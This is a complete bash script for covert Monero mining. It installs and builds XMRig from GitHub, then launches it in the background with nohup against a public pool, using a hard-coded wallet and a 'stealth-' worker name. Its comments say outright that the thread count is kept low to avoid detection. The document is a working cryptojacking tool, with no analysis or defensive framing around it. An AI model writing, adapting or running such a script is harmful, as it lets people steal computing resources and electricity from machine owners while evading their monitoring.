#!/bin/bash

# --- Configuration ---
WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
POOL="pool.supportxmr.com:3333"
WORKER_ID="stealth-$(hostname)"
THREADS=8  # use fewer threads to reduce detection risk

# --- Install xmrig if not found ---
if ! command -v xmrig &> /dev/null; then
    echo "Installing XMRig..."
    sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
    git clone https://github.com/xmrig/xmrig.git
    mkdir xmrig/build && cd xmrig/build
    cmake .. && make -j$(nproc)
    cd ../..
fi

# --- Start Mining ---
echo "Starting miner with low thread count to avoid detection..."
nohup ./xmrig/build/xmrig -o $POOL -u $WALLET -k --donate-level 1 -t $THREADS -p $WORKER_ID > miner.log 2>&1 &
